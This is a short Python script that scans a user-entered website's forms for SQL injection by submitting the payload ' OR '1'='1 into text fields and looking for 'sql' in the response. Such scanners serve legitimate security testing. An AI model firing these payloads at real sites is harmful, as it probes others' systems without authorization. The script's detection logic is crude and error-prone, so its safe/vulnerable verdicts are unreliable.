import requests
from bs4 import BeautifulSoup

def find_sql_injection_vulnerabilities(url):
    # Make a GET request to the URL
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all form fields in the page
    forms = soup.find_all('form')
    print(f"[INFO] Found {len(forms)} form(s) on {url}")
    
    for form in forms:
        action = form.get('action')
        method = form.get('method')
        inputs = form.find_all('input')
        form_details = {
            'action': action,
            'method': method,
            'inputs': inputs
        }
        print(f"[INFO] Form found with action: {action}, method: {method}")
        
        # Try a basic SQL injection payload on the form
        payload = "' OR '1'='1"
        for input_tag in inputs:
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')

            if input_type == 'text':
                # Assuming this is a text field vulnerable to SQL injection
                data = {input_name: payload}
                response = None
                if method.lower() == 'post':
                    response = requests.post(url, data=data)
                else:
                    response = requests.get(url, params=data)
                
                if "mysql" in response.text.lower() or "sql" in response.text.lower():
                    print(f"[WARNING] Potential SQL injection vulnerability in form action {action}")
                    print(f"Form input {input_name} might be vulnerable!")
                else:
                    print(f"[SAFE] Form {input_name} seems secure.")

if __name__ == "__main__":
    target_url = input("Enter the website URL to scan for SQL injection: ")
    find_sql_injection_vulnerabilities(target_url)
